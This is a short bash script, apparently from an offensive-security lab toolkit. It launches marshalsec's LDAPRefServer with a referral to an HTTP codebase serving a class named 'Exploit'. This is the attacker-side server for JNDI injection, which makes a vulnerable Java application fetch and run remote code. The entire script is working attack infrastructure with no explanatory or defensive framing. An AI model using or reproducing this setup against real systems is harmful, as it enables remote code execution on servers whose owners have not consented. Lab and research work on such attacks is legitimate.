#!/usr/bin/env bash
set -euo pipefail
source "$(cd "$(dirname "$0")" && pwd)/lib.sh"
need_java
[[ -f "$PCYB_VENDOR/marshalsec.jar" ]] || ./scripts/build-marshalsec.sh

CODEBASE="http://${PCYB_HTTP_HOST}:${PCYB_HTTP_PORT}/#Exploit"
echo "LDAP Ref → $CODEBASE"
start_bg ldap java -cp "$PCYB_VENDOR/marshalsec.jar" \
  marshalsec.jndi.LDAPRefServer "$CODEBASE" "$PCYB_LDAP_PORT"

wait_port "$PCYB_LDAP_HOST" "$PCYB_LDAP_PORT" 15
echo "LDAP listening on ${PCYB_LDAP_HOST}:${PCYB_LDAP_PORT}"
